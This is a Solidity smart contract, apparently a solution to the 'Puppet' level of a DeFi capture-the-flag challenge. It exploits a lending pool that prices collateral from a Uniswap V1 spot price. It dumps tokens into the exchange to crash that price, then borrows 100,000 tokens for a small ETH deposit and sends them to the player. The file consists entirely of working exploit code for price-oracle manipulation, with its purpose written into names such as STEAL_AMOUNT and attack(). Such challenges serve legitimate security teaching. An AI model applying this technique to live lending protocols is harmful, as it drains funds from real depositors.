// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "solmate/src/tokens/ERC20.sol";
import "./PuppetPool.sol";

interface IUniswapV1Exchange {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 eth_bought);
}

contract AttackPuppetPool {

    IUniswapV1Exchange exchange;
    PuppetPool pool;
    ERC20 token;
    address player;
    uint256 constant SWAP_AMOUNT = 1000 ether;
    uint256 constant STEAL_AMOUNT = 100_000 ether;

    constructor(IUniswapV1Exchange _exchange, PuppetPool _pool, ERC20 _token, address _player) {
        exchange = _exchange;
        pool = _pool;
        token = _token;
        player = _player;
    }

    function attack() payable external {
        require(token.balanceOf(address(this)) >= SWAP_AMOUNT, "Not enough tokens to swap.");

        token.approve(address(exchange), SWAP_AMOUNT);

        exchange.tokenToEthSwapInput(SWAP_AMOUNT, 1, block.timestamp + 1);

        uint256 depositRequired = pool.calculateDepositRequired(STEAL_AMOUNT);

        require(address(this).balance >= depositRequired, "Not enough funds to exploit.");

        pool.borrow{value: depositRequired}(STEAL_AMOUNT, player);
    }

    receive() external payable {}
}